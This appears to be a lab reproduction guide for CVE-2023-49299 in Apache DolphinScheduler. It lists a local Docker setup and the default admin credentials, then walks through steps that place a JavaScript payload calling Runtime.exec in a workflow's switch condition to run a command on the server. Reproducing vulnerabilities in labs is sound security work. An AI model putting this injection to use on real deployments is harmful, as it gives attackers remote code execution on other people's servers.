# Apache DolphinScheduler (CVE-2023-49299)

```bash
# Startup
docker compose up -d

# Home page
http://10.0.0.252:12345/dolphinscheduler/ui

# Login
Username: admin
Password: dolphinscheduler123
```

CVE reference:
https://xz.aliyun.com/news/13419

Steps:

1. Log in as administrator.
2. Create tenant `user1`.
3. Create a project.
4. Create workflow `switch(aaa) -> bash(bbb)`. In the condition box for `switch(aaa)`, enter `var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("touch /tmp/rce")};`; select `bash(bbb)` as the branch target and `user1` as the tenant.
5. Release the workflow.
6. Run the workflow.
7. Enter the container and check `/tmp`: `docker exec -it cve-dolphinscheduler ls -l /tmp`.
